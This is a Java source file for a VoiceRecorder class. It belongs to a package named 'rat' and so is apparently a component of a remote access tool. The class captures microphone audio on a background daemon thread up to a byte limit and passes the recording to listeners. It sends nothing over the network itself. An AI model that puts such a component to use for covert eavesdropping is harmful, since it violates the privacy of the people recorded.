package de.sogomn.rat;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.TargetDataLine;

import de.sogomn.engine.util.AbstractListenerContainer;

public final class VoiceRecorder extends AbstractListenerContainer<IRecorderListener> {
	
	private ByteArrayOutputStream out;
	private TargetDataLine line;
	private Thread thread;
	
	private int limit;
	
	private static final int BUFFER_SIZE = 1024;
	
	public VoiceRecorder(final int maximum) {
		this.limit = maximum;
	}
	
	public VoiceRecorder() {
		this(0);
	}
	
	private byte[] getData() {
		final byte[] data = out.toByteArray();
		
		out.reset();
		
		return data;
	}
	
	private void captureAudio() {
		try {
			final byte[] data = new byte[BUFFER_SIZE];
			
			line.read(data, 0, BUFFER_SIZE);
			out.write(data);
		} catch (final IOException ex) {
			ex.printStackTrace();
		}
	}
	
	public void start() {
		final Runnable runnable = () -> {
			while (out.size() < limit) {
				captureAudio();
			}
			
			stop();
			
			final byte[] data = getData();
			
			notifyListeners(listener -> listener.done(this, data));
		};
		
		try {
			out = new ByteArrayOutputStream();
			line = AudioSystem.getTargetDataLine(null);
			thread = new Thread(runnable);
			
			line.open();
			line.start();
			thread.setDaemon(true);
			thread.start();
		} catch (final LineUnavailableException ex) {
			stop();
		}
	}
	
	public void stop() {
		try {
			thread.interrupt();
			line.close();
			out.close();
		} catch (final IOException ex) {
			//...
		} finally {
			thread = null;
			line = null;
		}
	}
	
	public void setLimit(final int limit) {
		this.limit = limit;
	}
	
}
